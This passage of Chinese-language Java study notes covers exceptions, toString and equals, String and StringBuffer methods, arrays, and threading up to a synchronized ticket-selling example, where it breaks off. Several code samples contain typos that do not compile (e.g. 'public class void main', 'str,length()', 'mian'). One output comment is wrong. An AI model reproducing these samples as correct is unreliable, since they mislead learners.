v5le0n9.TestConst.main(TestConst.java:21)\n*/\n/**\n异常解释：\n在main方法有java.lang包下的算术错误：除零错误\n第21行导致第10行错误，第10行导致第14行错误，第14行导致第6行错误\n*/\n```\n\n在调试时，可以用`_printStackTrace`观察哪里出错。\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        return a / b;\n    }\n    public void f()\n    {\n        g();\n    }\n    public void g()\n    {\n        divide(6, 0);\n    }\n}\npublic class TestExcep_8\n{\n    public static void main(String[] args)\n    {\n        try\n        {\n            new A().f();\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();//捕获异常函数\n        }    \n    }\n}\n/**\njava.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:6)\n\tat v5le0n9.A.g(TestConst.java:14)\n\tat v5le0n9.A.f(TestConst.java:10)\n\tat v5le0n9.TestConst.main(TestConst.java:23)\n*/\n/**\n此程序与Excep_7的输出几乎一致，只是第一行前面没有Exception显示\n如果想验证语句是否有错，可以用try...catch()语句，用_printStackTrace找出具体的错误位置\n*/\n```\n\n### 常见异常\n\n#### 空指针异常\n\n```java\npackage v5le0n9;\nclass Person\n{\n    public int age;\n}\npublic class TestNullPointerException\n{\n    public static void main(String[] args)\n    {\n        Person p = null;\n        System.out.println(p.age);\n    }\n}\n/**\nException in thread \"main\" java.lang.NullPointerException\n\tat v5le0n9.TestConst.main(TestConst.java:11)\n*/\n```\n\n#### 下标越界异常\n\n```java\npackage v5le0n9;\npublic class TestIndexOutOf\n{\n    public static void main(String[] args)\n    {\n        String friends[] = {\"Lisa\", \"Bily\", \"Kessy\"};\n        for(int i=0; i<5; i++)\n        {\n            System.out.println(friends[i]);\n        }\n        System.out.println(\"\\nThis is the end.\\n\");\n    }\n}\n/**\nLisa\nBily\nKessy\nException in thread \"main\" java.lang.ArrayIndexOutOfBoundsException: 3\n\tat v5le0n9.TestConst.main(TestConst.java:9)\n*/\n```\n\n#### 算数异常\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.divide(6, 2);//正确\n        //aa.divide(6, 0);//异常\n        System.out.printf(\"看得见我吗？\");//上一句异常直接终止程序，所以这一条不输出\n    }\n}\n/**\nException in thread \"main\" java.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:7)\n\tat v5le0n9.TestConst.main(TestConst.java:17)\n*/\n```\n\n### 异常的分类\n\n$$\nThrowable\n\\begin{cases}\nError\\begin{cases}...\\end{cases}\\\\\nException\\begin{cases}RuntimeException\\begin{cases}ArithmeticException\\\\...\\end{cases}\\\\\n...\\end{cases}\n\\end{cases}\n$$\n\n1. Error是系统错误，程序员无法处理这些异常\n2. Exception是程序员可以捕获并处理的异常\n3. RuntimeException的子类异常是可以处理也可以不处理的异常\n4. 凡是继承自Exception但又不是RuntimeException子类的异常我们都必须捕捉并进行处理\n\n有些异常在编译时就报错。\n\n```java\nimport java.io.*;\nclass A\n{\n    public void f()\n    {//在编译时就报错，必须处理\n        throw new IOException();//throw 抛出异常，这个异常是非RuntimeException子类\n    }\n    public void g()\n    {//在运行时报错\n        throw new ArithmeticException();//RuntimeException子类\n    }\n}\npublic class Exception\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n    }\n}\n```\n\n### 处理异常的两种方式\n\n#### try...catch...\n\n```java\nimport java.io.*;\nclass A\n{\n    public void f()\n    {\n        try\n        {\n            throw new IOException(); \n        }\n        catch(IOException e)\n        {\n            //...\n        }\n    }\n}\n```\n\n#### throws\n\n```java\nimport java.io.*;\nclass A\n{\n    public void f() throws IOException\n    {//throws IOException表示调用f方法时f方法可能会抛出IOException异常，建议调用f方法时最好对f方法可能抛出的IOException异常进行捕捉。如果抛出异常，本方法不处理，交给调用者处理。如果抛出的异常是RuntimeException子类，则调用者可以不处理。\n        //throw new IOException();//也可以不抛出异常\n    }\n}\npublic class Exception_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        try\n        {\n            aa.f();\n        }\n        catch(IOExeption e)\n        {\n            //...\n        }\n    }\n}\n```\n\n### 异常处理步骤\n\n```java\ntry\n{\n    //可能出现异常的代码块\n    //语句1;\n   \t//语句2;\n}\ncatch(ExceptionName1 e)\n{\n    //当产生ExceptionName1异常时的处理措施\n}\ncatch(ExceptionName2 e)\n{\n    //当产生ExceptionName2异常时的处理措施\n}\nfinally\n{\n    //无论是否捕捉到异常都必须处理的代码\n}\n```\n\n```java\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep_9\n{\n    try\n    {\n        new A().divide(6, 0);\n    }\n    catch(ArithmeticException e)\n    {\n        System.out.printf(\"huuu\\n\");//输出\n    }\n    catch(ArrayIndexOutOfBoundsException e)\n    {\n        System.out.printf(\"yooooo\\n\");//不输出\n    }\n    finally\n    {\n        System.out.printf(\"hhhh\\n\");//输出\n    }\n}\n```\n\n#### Finally的作用\n\n无论try所指定的程序块中是否抛出异常，也无论catch语句的异常类型是否与所抛出的异常类型一致finally中的代码都会执行。finally语句为异常处理提供一个统一的出口，使得在控制流程转到程序的其它部分之前，能够对程序的装药作统一的管理。通常在finally语句中可以进行资源的清除工作，如关闭打开的文件、删除临时文件等。\n\n## 自定义异常\n\n```java\npackage v5le0n9;\nclass DivisorIsZeroException extends Exception\n{//自定义异常必须是Throwable的一个子类,更确切是Exception的子类\n    public DivisorIsZeroException(String name)\n    {\n        super(name);\n    }\n}\nclass A\n{\n    public int divide(int a, int b) throws DivisorIsZeroException\n    {\n        int m = 0;\n        if(0 == b)\n            throw new DivisorIsZeroException(\"除数不能为零\");\n        else\n            m = a / b;\n        return m;\n    }\n}\npublic class TestExcep_10\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        try\n        {\n            aa.divide(6, 0);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n        }\n    }\n}\n/**\nv5le0n9.DivisorIsZeroException: 除数不能为零\n\tat v5le0n9.A.divide(TestConst.java:15)\n\tat v5le0n9.TestConst.main(TestConst.java:28)\n*/\n```\n\n## 异常的范围\n\n```java\nclass A extends Exception\n{}\nclass B extends Exception\n{}\nclass C extends Exception\n{}\nclass M\n{\n    void f() throws A,B\n    {}\n}\nclass N extends M\n{\n    //void f() throws A,B,C//范围过大\n    //void f() throws A//可以\n    void f() throws A,B\n    {//可以throws A或B，也可以throws A,B，也可以不throws\n        \n    }\n}\nclass Test\n{\n    public void k(M mm)\n    {\n        try\n        {\n            mm.f();\n        }\n        catch(A aa)\n        {}\n        catch(B bb)\n        {}\n    }\n}\nclass TestExtendExce\n{\n    public static void main(String[] args)\n    {\n        M m = new M();\n        N n = new N();\n    }\n}\n```\n\n## 注意事项\n\n- 所有的catch只能有一个被执行\n\n- 有可能所有的catch都没被执行\n\n- 先catch子类异常再catch父类异常\n\n  ```java\n  class A extends Exception\n  {}\n  class B extends A\n  {}\n  class C extends B\n  {}\n  class M\n  {\n      public void compare(int i, int j) throws A,B\n      {\n          if(i > j)\n              throw new A();\n          else\n              throw new B();\n      }\n  }\n  public class void main(String[] args)\n  {\n      M mm = new M();\n      try\n      {\n          mm.compare(-4, 1);\n      }\n      catch(B bb)\n      {//因为B是A的子类，先catch子类再catch父类\n          System.out.println(\"左边不能小于右边\");\n      }\n      catch(A aa)\n      {\n          System.out.println(\"左边不能大于右边\");\n      }\n  }\n  ```\n\n- catch与catch之间不能有其它代码\n\n- 重写方法抛出异常的范围不能大于被重写方法排除的异常范围\n\n# toString\n\n```java\nclass A// extends Object\n{//A类默认继承Object类，Object类有toString方法\n    public String toString()\n    {\n        return \"hhhh\\n\";\n    }\n}\npublic class TestObject\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        System.out.printf(\"%s\\n\", aa.toString());//输出hhhh\\n,如果不重写，返回“类名@该对象在堆中地址的哈希码”\n    }\n}\n```\n\n```java\npackage v5le0n9;\nclass Point_\n{\n    public int x, y;\n    public Point_(int x, int y)\n    {\n        this.x = x;\n        this.y = y;\n    }\n}\npublic class TestPoint\n{\n    public static void main(String[] args)\n    {\n        Point_ p = new Point_(1, 2);\n        System.out.printf(\"%s\\n\", p);//输出v5le0n9.Point_@28d93b30\n        //相当于父类的_toString方法，返回“类名@该对象在堆中地址的哈希码”\n    }\n}\n```\n\n```java\npackage v5le0n9;\nclass Point_\n{\n    public int x, y;\n    public Point_(int x, int y)\n    {\n        this.x = x;\n        this.y = y;\n    }\n    public String toString()\n    {\n        return \"[\" + x + \",\" + y + \"]\";\n    }\n}\npublic class TestPoint\n{\n    public static void main(String[] args)\n    {\n        Point_ p = new Point_(1, 2);\n        System.out.printf(\"%s\\n\", p);//输出[1,2]\\n\n        System.out.println(p);//输出[1,2]\\n\n    }\n}\n```\n\n# equals\n\n```java\nclass A\n{\n    public int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n}\npublic class TestStringEquals\n{\n\tpublic static void main(String[] args)\n    {\n        A aa1 = new A(2);\n        A aa2 = new A(2);\n        System.out.println(aa1);//A@15db9742，相当于System.out.println(aa1.toString());\n        System.out.println(aa2);//A@6d06d69c,aa1和aa2指向不同的堆地址\n        //equals指示其他某个对象是否与此对象“相等”\n        aa1.equals(aa2);//编译运行无错误\n        System.out.println(aa1.equals(aa2));//输出flase，表明equals是用来判断对象地址是否一样，而不是判断地址存的数值是否一样\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n    public boolean equals(Object obj)\n    {\n        //if(this.i == obj.i)//错误，obj是指针，局部变量，形参，因为父类引用不能调用子类特有成员i（利用多态知识）\n        A aa = (A)obj;//形参obj已经指向子类了，所以只要强制转换即可，相当于B bb = (B)aa;\n        if(this.i == aa.i)\n            return true;\n        else\n            return false;\n    }\n}\npublic class TestStringEquals_2\n{\n\tpublic static void main(String[] args)\n    {\n        A aa1 = new A(2);\n        A aa2 = new A(2);\n        System.out.println(aa1.equals(aa2));//如何让这个返回true，需要重写equals方法，地址存的数值一样则返回true\n    }\n}\n```\n\n# String类\n\n```java\npublic class TestString_1\n{\n    public static void main(String[] args)\n    {//_toString已经重写了equals方法\n        String str1 = new String(\"China\");\n        String str2 = new String(\"China\");\n        \n        System.out.println(str1.equals(str2));//true\n        //equals表示此对象的值与形参的值是否相等\n        \n        if(str1 == str2)\n        //==表示对比两个对象的地址是否相等\n            System.out.println(\"str1 == str2\");\n        else\n            System.out.println(\"str1 != str2\");//输出\n        \n        String str3 = \"Chinese\";\n        String str4 = \"Chinese\";\n        //str3与str4都指向了数据区块的同一块内存“Chinese”\n        if(str3 == str4)\n            System.out.println(\"str3 == str4\");//输出\n        else\n            System.out.println(\"str3 != str4\");\n    }\n}\n```\n\n## String类常用方法\n\n| String类方法                                          | 用途                                                       |\n| ----------------------------------------------------- | ---------------------------------------------------------- |\n| public char charAt(int index)                         | 返回字符串中第index个字符                                  |\n| public int length()                                   | 返回字符串的长度                                           |\n| public int indexOf(String str)                        | 返回字符串中出现str的第一个位置                            |\n| public int indexOf(String str, int fromIndex)         | 返回字符串中从fromIndex开始出现str的第一个位置             |\n| public boolean equalsIgnoreCase(String another)       | 比较字符串与another是否一样(忽略大小写)                    |\n| public String replace(char oldChar, char newChar)     | 在字符串中用newChar字符替换oldChar字符                     |\n| public boolean startsWith(String prefix)              | 判断字符串是否以prefix字符串开头                           |\n| public booleab endsWith(String suffix)                | 判断字符串是否以suffix字符串结尾                           |\n| public String toUpperCase()                           | 返回一个字符串为该字符串的大写形式                         |\n| public String toLowerCase()                           | 返回一个字符串为该字符串的小写形式                         |\n| public String substring(int beginIndex)               | 返回该字符串从beginIndex开始到结尾的子字符串               |\n| public String substring(int beginIndex, int endIndex) | 返回该字符串从beginIndex开始到endIndex结尾的字符串         |\n| public static String valueOf(...)                     | 将基本类型数据转换为字符串                                 |\n| public String[] split(String regex)                   | 将一个字符串按照指定的分隔符分分隔，返回分隔后的字符串数组 |\n\n## 常用方法举例\n\n```java\npublic class TestString_2\n{\n    public static void main(String[] args)\n    {\n        //整型转换为字符串\n        int i = 123;\n        //String str = i;//类型不一致\n        String str = String.valueOf(i);\n        System.out.printf(\"str = %s\\n\", str);//str = 123\n        \n        //字符串转换为整型\n        str = \"456\";\n        try\n        {\n            i = Integer.parseInt(str);//这个会抛NumberFormatException异常，比如“45a”\n        \tSystem.out.printf(\"i = %d\\n\", i);\n        }\n        catch(NumberFormatException e)\n        {\n            System.out.println(\"数字格式化异常！\");\n        }\n    }\n}\n```\n\n```java\npublic class Test\n{\n    public static void main(String[] args)\n    {\n        String s1 = \"v5le0n9\", s2 = \"V5LE0N9\";\n        System.out.println(s1.charAt(1));//5\n        System.out.println(s2.length());//7\n        System.out.println(s1.indexOf(\"0n9\"));//4\n        System.out.println(s1.indexOf(\"0N9\"));//-1\n        System.out.println(s1.equals(s2));//false\n        System.out.println(s1.equalsIgnoreCase(s2));//true\n        System.out.println(s1.toUpperCase());//V5LE0N9\n        System.out.println(s2.toLowerCase());//v5le0n9\n        System.out.println(s2.substring(3));//EN09\n        System.out.println(s2.substring(3,5));//E0\n        \n        String s = \"世界如此美好！\";\n        String sr = s.replace(\"世界\", \"生活\");\n        System.out.println(sr);//生活如此美好！\n        System.out.println(s.startsWith(\"世界\"));//true\n        System.out.println(s.endsWith(\"美好\"));//false\n        \n        String st = \"    hello world   \";\n        System.out.println(st.trim());//hello world\n        \n        int j = 1234567;\n        String sNumber = String.valueOf(j);\n        System.out.println(\"j是\"+sNumber.length()+\"位数\");\n        \n        String str = \"Mary,F,1976\";\n        String[] sPlit = str.split(\",\");\n        for(int i=0; i<sPlit.length; i++)\n        {//数组的length不用()\n            System.out.println(sPlit[i]);\n        }\n    }\n}\n```\n\n```java\npublic class TestString_3\n{\n    public static void main(String[] args)\n    {\n        String str = \"abAM,!123\";\n        int cntU = 0;//大写字母个数\n        int cntL = 0;//小写字母个数\n        int cntOther = 0;//其它\n        int i;\n        \n        //方法一\n        for (i=0; i<str.length(); i++)\n        {\n            char ch = str.charAt(i);\n            if(ch>='a' && ch<='z')\n                cntL++;\n            else if(ch>='A' && ch<='Z')\n                cntU++;\n            else\n                cntOther++;\n        }\n        \n        //方法二\n        for(i=0; i<str.length(); i++)\n        {\n            char ch = str.charAt(i);\n            if(Character.isUpperCase(ch))\n                cntU++;\n            else if(Character.isLowerCase(ch))\n                cntL++;\n            else\n                cntOther++;\n        }\n        \n        //方法三\n        String s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n        String s2 = \"abcdefghijklmnopqrstuvwxyz\";\n        for(i=0; i<str,length(); i++)\n        {\n            char ch = str.charAt(i);\n            if(-1 != s1.indexOf(ch))//如果不是-1，说明str中有这个字符\n                cntU++;\n            else if(-1 != s2.indexOf(ch))\n                cntL++;\n            else\n                cntOther++;\n        }\n        \n        System.out.printf(\"大写字母个数为%d\\n\",cntU);\n        System.out.printf(\"小写字母个数为%d\\n\",cntL);\n        System.out.printf(\"其它字符个数为%d\\n\",cntOther);\n    }\n}\n```\n\n```java\npublic class TestString_4\n{\n    public static void main(String[] args)\n    {\n        String str1 = \"abcabcbacbac\";\n        String str2 = \"abc\";\n        int index = -1;\n        int cnt = 0;\n        index = str1.indexOf(str2);\n        while(-1 != index)\n        {\n            cnt++;\n            index = str1.indexOf(str2, index+str2.length());\n        }\n        System.out.printf(\"%d\\n\",cnt);//2\n    }\n}\n```\n\n# printf和println的区别\n\n```java\nclass Dian\n{\n    public int x, y;\n    public Dian(int x,int y)\n    {\n        this.x = x;\n        this.y = y;\n    }\n    public String toString()\n    {\n        return \"[\" + x + \",\" + y + \"]\";\n    }\n}\npublic class TestPrint\n{\n    public static void main(String[] args)\n    {\n        Dian d = new Dian(3, 2);\n        System.out.printf(\"%s\\n\", d);\n        System.out.println(d);\n        \n        int i, j, k;\n        i = 1;\n        j = 2;\n        k = 3;\n        System.out.printf(\"%d的值 + %d的值 是 %d\\n\", i, j, k);\n        System.out.println(i + \"的值\" + j + \"的值 是 \" + k);\n        \n        int m = 47;\n        System.out.println(m);\n        System.out.printf(\"%d\\n\", m);\n        System.out.printf(\"十进制数字%d用十六进制表示是：%#X\\n\", m, m);\n        System.out.println(\"十进制数字\" + m + \"用十六进制表示是：0X\" + Integer.toHexString(m).toUpperCase());\n        //Integer.toHexString()返回的是字符串，将字符串改成大写就直接在后面加toUpperCase()\n        \n        System.out.printf(\"%b\\n\", \"abc\".equals(\"zhangsan\"));\n        System.out.printf(\"%d\\n\", \"abc\".length());\n    }\n}\n```\n\n# StringBuffer\n\nString类对象一旦创建就不可更改，因为String类用final修饰了。如果经常对字符串内容进行修改，则使用StringBuffer。\n\n## StringBuffer类的构造函数\n\n| 构造函数                          | 含义                                                  |\n| --------------------------------- | ----------------------------------------------------- |\n| public StringBuffer()             | 创建一个空的没有任何字符的StringBuffer对象            |\n| public StringBuffer(int capacity) | 创建一个不带字符，但具有指定初始容量的字符串缓冲区    |\n| public StringBuffer(String str)   | 创建一个StringBuffer对象，包含与str对象相同的字符序列 |\n\n## StringBuffer常用方法\n\n| 常用方法                                       | 含义                                                         |\n| ---------------------------------------------- | ------------------------------------------------------------ |\n| public StringBuffer append(...)                | 为该StringBuffer对象添加字符序列，返回添加后的该StringBuffer对象引用 |\n| public StringBuffer insert(...)                | 为该StringBuffer对象在指定位置插入字符序列，返回修改后的该StringBuffer对象引用 |\n| public StringBuffer delete(int start, int end) | 删除从start开始到end-1为止的一段字符序列，返回修改后的该StringBuffer对象引用 |\n| public StringBuffer reverse()                  | 将字符序列逆序，返回修改后的该StringBuffer对象引用           |\n\n```java\npublic class TestStringBuffer\n{\n    public static void main(String[] args)\n    {\n        StringBuffer sb = new StringBuffer();\n        sb.append(\"abc\");\n        sb.append(\"123\");\n        System.out.println(\"sb = \" + sb);//sb = abc123\n        sb.insert(3,\"--\");\n        System.out.println(\"sb = \" + sb);//sb = abc--123\n        sb.delete(2, 6);//把下标[2,6)的字符删除\n        System.out.println(\"sb = \" + sb);//sb = ab23\n        sb.reverse();\n        System.out.println(\"sb = \" + sb);//sb = 32ba\n        String str = sb.toString();\n        System.out.println(\"str = \" + str);//str = 32ba\n    }\n}\n```\n\n```java\npublic class TestStringBuffer_2\n{\n    public static void main(String[] args)\n    {\n        StringBuffer sb = new StringBuffer(\"zhangsan\");\n        //StringBuffer sb2 = \"张三\";//错误，前面是StringBuffer类，而张三是String类，类型不一致\n        System.out.println(sb);//zhangsan\n    }\n}\n```\n\n# 数组\n\n```java\npublic class TestArray\n{\n    public static void mian(String[] args)\n    {//定义数组的三种方法\n        //方式一\n        int[] arr1;\n        arr1 = new int[3];\n        arr1[0] = 0;\n        arr1[1] = 1;\n        arr1[2] = 2;\n        showArr(arr1);\n        \n        //方式二\n        int[] arr2 = new int[]{0,1,2};\n        showArr(arr2);\n        //System.out.println(arr2);//错误，一维数组的内容不能通过println直接输出\n        \n        //错误写法\n        //int[3] arr3 = new int[]{0,1,2};\n        //int[] arr4 = new int[3]{0,1,2};\n        //int[3] arr5 = new int[3]{0,1,2};\n        \n        //方式三\n        int[] arr6 = {0,1,2};\n        showArr(arr6);\n        arr6 = new int[]{5,4,3,2,1};\n        showArr(arr6);\n    }\n    public static void showArr(int[] arr)\n    {\n        for(int i=0; i<arr.length; i++)\n            System.out.println(arr[i]);\n    }\n}\n```\n\n## 创建并使用基本类型数组\n\n```java\npublic class TestArray_2\n{\n    public static void main(String[] args)\n    {//数组直接存数据\n        int[] s;//在栈中生成一个局部变量s\n        s= new int[10];//在堆中生成一个数组对象，长度为10，值默认为0\n        for(int i=0; i<10; i++)\n        {\n            s[i] = 2 * i + 1;//给堆中的每个元素赋值\n            System.out.println(s[i]);\n        }\n    }\n}\n```\n\n## 创建并使用引用类型数组\n\n```java\nclass MyDate\n{\n    private int day;\n    private int month;\n    private int year;\n    public MyDate(int d, int m, int y)\n    {\n        day = d;\n        month = m;\n        year = y;\n    }\n    public void display()\n    {\n        System.out.println(day + \"-\" + month + \"-\" + year);\n    }\n}\npublic class TestArray_3\n{\n    public static void main(String[] args)\n    {//数组存指针变量\n        MyDate[] m;//在栈中生成一个局部变量m\n        m = new MyDate[10];//在堆中生成一个数组对象，长度为10，值默认为NULL\n        for(int i=0; i<10; i++)\n        {\n            m[i] = new MyDate(i+1, i+1, 1990+i);//第i个指针对象指向对应的数据（也在堆中）\n            m[i].display();\n        }\n    }\n}\n```\n\n## 数组的拷贝\n\n```java\nclass TestArrayCopy\n{\n    public static void main(String[] args)\n    {\n        int[] a = {1,2,3,4,5};\n        int[] b = {-1,-2,-3,-4,-5};\n        System.arraycopy(a,0,b,1,2);//把a数组从下标为0的元素开始，长度为2的一串数，从b数组下标为1开始覆盖\n        System.out.println(\"a = \");\n        for(int i=0; i<a.length; i++)\n            System.out.println(a[i]);//a = 12345\n        \n        System.out.println(\"b = \");\n        for(i=0; i<b.length; i++)\n            System.out.println(b[i]);//b = -112-4-5\n    }\n}\n```\n\n## 数组的排序\n\n```java\nimport java.util.*;\npublic class TestArraySort\n{\n    public static void main(String[] args)\n    {\n        int[] data = {1,3,5,7,2,4,6,8,10,9};\n        System.out.println(\"排序前数组data中的内容是：\");\n        showArray(data);\n        \n        Arrays.sort(data);\n        \n        System.out.println(\"排序后数组data中的内容是：\");\n        showArray(data);\n    }\n    public static void showArray(int[] data)\n    {\n        for(int e : data)//把data中的每个元素取出来赋给e\n            System.out.printf(\"%d\\t\", e);\n        System.out.println(\"\");\n    }\n}\n```\n\n# 线程\n\n线程是一个程序里的不同执行路径。\n\n## 创建线程的两种方式\n\n创建线程的第一种方式：\n\n1. 创建一个继承Thread的类(假定类名为A)，并重写Thread的run方法\n2. 构造一个A类对象(假定对象名为aa)\n3. 调用aa的start方法(start方法是从Thread继承过来的)\n\n```java\nclass A extends Thread\n{\n    public void run()\n    {//重写父类的run方法\n        while(true)\n            System.out.println(\"AAAA\");\n    }\n}\npublic class TestThread\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        //aa.run();//陷入死循环，一直输出A（单线程）\n        aa.start();//A，B交替执行（多线程）\n        //start()的功能：创建一个新的线程，执行run方法里的代码。此时，run方法里的代码与下面代码交替执行\n        //一个Thread对象只能调用一次start方法\n        while(true)\n        {\n            System.out.println(\"BBBB\");\n        }\n    }\n}\n```\n\n创建线程的第二种方式：\n\n1. 定义一个实现了Runnable接口的类(假定为A)\n2. 创建A类对象aa\n3. 利用aa构造一个Thread对象t\n4. 调用t中的start方法\n\n```java\nclass A implements Runnable\n{\n    public void run()\n    {//重写父类的run方法\n        while(true)\n            System.out.println(\"AAAA\");\n    }\n}\npublic class TestThread_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n       \tThread t = new Thread(aa);\n        t.start();\n        while(true)\n        {\n            System.out.println(\"BBBB\");\n        }\n    }\n}\n```\n\n## 线程的常用方法\n\n| 常用方法                               | 含义                               |\n| -------------------------------------- | ---------------------------------- |\n| public final void setName(String name) | 设置当前线程的名字                 |\n| public static Thread currentThread()   | 返回对当前正在执行的线程对象的引用 |\n| public final String getName()          | 返回当前线程的名字                 |\n\n```java\nclass A extends Thread\n{\n    public void run()\n    {\n        System.out.printf(\"%s在执行\\n\", Thread.currentThread().getName());\n    }\n}\npublic class TestThread_3\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        aa1.setName(\"v5le0n9\");\n        aa1.start();\n        \n        A aa2 = new A();\n        aa2.setName(\"l30n9ry0n\");\n        aa2.start();\n        \n        A aa3 = new A();\n        aa3.setName(\"凉凉\");\n        aa3.start();\n\n        System.out.printf(\"%s在执行\\n\", Thread.currentThread().getName());\n    }\n}\n/**\nl30n9ry0n在执行\n凉凉在执行\nmain在执行\nv5le0n9在执行\n*/\n```\n\n## 线程的控制\n\n| 方法                 | 功能                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| isAlive()            | 判断线程是否还“活”着，即线程是否还未终止                     |\n| getPriority()        | 获得线程的优先级数值                                         |\n| setPriority()        | 设置线程的优先级数值                                         |\n| Thread.sleep()       | 将当前线程睡眠指定毫秒数                                     |\n| join()               | 调用某线程的该方法，将当前线程与该线程“合并”，即等待该线程结束，再恢复当前线程的运行 |\n| yield()              | 让出CPU，当前线程进入就绪队列等待调度                        |\n| wait()               | 当前线程进入对象的wait pool                                  |\n| notify()/notifyAll() | 唤醒对象的wait pool中的一个/所有等待线程                     |\n\n```java\npublic class TestPriority\n{\n    public static void main(String[] args)\n    {\n        Thread t1 = new Thread(new T1());\n        Thread t2 = new Thread(new T2());\n        //最高优先级为10，最低优先级为1，默认优先级为5\n        t1.setPriority(Thread.NORM_PRIORITY + 3);\n        t1.start();\n        t2.start();\n    }\n}\nclass T1 implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<100; i++)\n            System.out.println(\"T1: \" + i);\n    }\n}\nclass T2 implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<100; i++)\n            System.out.println(\"----T2: \" + i);\n    }\n}\n```\n\n```java\npublic class TestSleep\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        Thread tt = new Thread(aa);\n        tt.start();\n    }\n}\nclass A implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<10; i++)\n        {\n            System.out.println(Thread.currentThread().getName() + \" \" + i);\n            try\n            {//sleep会抛异常，是必须要处理的异常，所以要用try...catch语句\n                Thread.sleep(1000);//1000ms=1s\n            }\n            catch(Exception e)\n            {}\n        }\n    }\n}\n```\n\n无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常。因为重写方法抛出异常的范围不能大于被重写方法抛出的异常范围。\n\n```java\nclass A implements Runnable\n{\n    public void run()// throws Exception\n    {}\n}\nclass B extends Thread \n{\n    public void run()// throws Exception\n    {}\n}\n```\n\n## 线程的让步\n\n让出CPU，给其它线程执行的机会。让运行中的线程主动放弃当前获得的CPU处理机会，但不是使该线程阻塞，而是使之转入就绪状态。\n\n```java\npublic class TestYield \n{\n    public static void main(String[] args)\n    {\n        MyThread mt = new MyThread();\n        Thread t1 = new Thread(mt);\n        Thread t2 = new Thread(mt);\n        t1.setName(\"线程A\");\n        t2.setName(\"线程B\");\n        t1.start();\n        t2.start();\n    }\n}\nclass MyThread implements Runnable\n{\n    public void run()\n    {\n        for(int i=1; i<=100; i++)\n        {\n            System.out.println(Thread.currentThread().getName() + \": \" + i);\n            if(0 == i%10)\n            {\n                Thread.yield();\n            }\n        }\n    }\n}\n```\n\n## 线程的串行化\n\n```java\npublic class TestJoin\n{\n    public static void main(String[] args)\n    {\n        MyRunner r = new MyRunner();\n        Thread t = new Thread(r);\n        t.start();\n        try\n        {\n            t.join();//暂停当前线程，直到其他线程执行完才继续执行当前线程\n            //在这程序中，执行完子线程再执行主线程\n        }\n        catch(InterruptedException e)\n        {\n            e.printStackTrace();\n        }\n        for(int i=0; i<50; i++)\n            System.out.println(\"主线程：\" + i);\n    }\n}\nclass MyRunner implements Runnable\n{\n    public void run()\n    {\n        for(int i=0; i<50; i++)\n            System.out.println(\"子线程：\" + i);\n    }\n}\n```\n\n## 生命周期控制\n\n```java\npublic class TestShutThread\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        Thread tt = new Thread(aa);\n        tt.start();\n        try\n        {\n            Thread.sleep(1000);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n        }\n        aa.shutDown();\n    }\n}\nclass A implements Runnable\n{\n    private boolean flag = true;\n    public void run()\n    {\n        while(flag)\n            System.out.println(\"AAAA\");\n    }\n    public void shutDown()\n    {\n        this.flag = false;\n    }\n}\n```\n\n## 线程同步问题产生的原因\n\n假设一个买票程序\n\n```java\nif(票数 > 0)\n{\n    买一张票;\n    票数减一;\n}\n```\n\n当票数只剩一张时，A买了一张票，此时线程切换到B，B显示剩一张票，他也买了一张票。这样就会导致一张票卖给了两个人。\n\n```java\nclass A implements Runnable\n{\n    private static int tickets = 100;//确保aa1和aa2共有100张票\n    public void run()\n    {\n        while(true)\n        {\n            if(tickets > 0)//8行\n            {\n                System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                tickets--;\n            }\n            else\n                break;//14行              \n        }\n    }\n}\npublic class TestTickets\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A();\n        Thread t1 = new Thread(aa1);\n        t1.start();\n        \n        A aa2 = new A();\n        Thread t2 = new Thread(aa2);\n        t2.start();\n    }\n}\n```\n\n数据库有“事务”的概念，也就是将所有操作放到事务里，这些操作要不就全部执行成功，要不就全部执行失败。推广到上面代码，即将第8行到第14行放到“事务”里。\n\n## 买票程序\n\n### synchronized关键字\n\nsynchronized可以用来修饰一个方法，也可以修饰一个方法内部的某个代码块。\n\n```java\n//synchronized修饰代码块\nsynchronized(类对象名aa)\n{\n    同步代码块\n}\n```\n\n功能：判断aa是否已经被其他线程霸占，如果发现已经被其他线程霸占，则当前线程陷入等待中，如果发现aa没有被其他线程霸占，则当前线程霸占aa对象，并执行同步代码块，在当前线程执行代码块时，其他线程将无法再执行同步代码块，当前线程执行完同步代码块后，会自动释放对aa对象的霸占，此时其他线程会相互竞争对aa的霸占，最后CPU会选择其中的某一个线程执行。\n\n```java\nclass A implements Runnable\n{\n    private int tickets = 100;//static可加可不加，因为都是调用同一个对象\n    public void run()\n    {\n     \twhile(true)\n     \t{\n            synchronized(this)\n            {\n                if(tickets > 0)\n                {\n                    System.out.printf(\"%s线程正在卖出第%d张票\\n\", Thread.currentThread().getName(), tickets);\n                    tickets--;\n                }\n                else\n         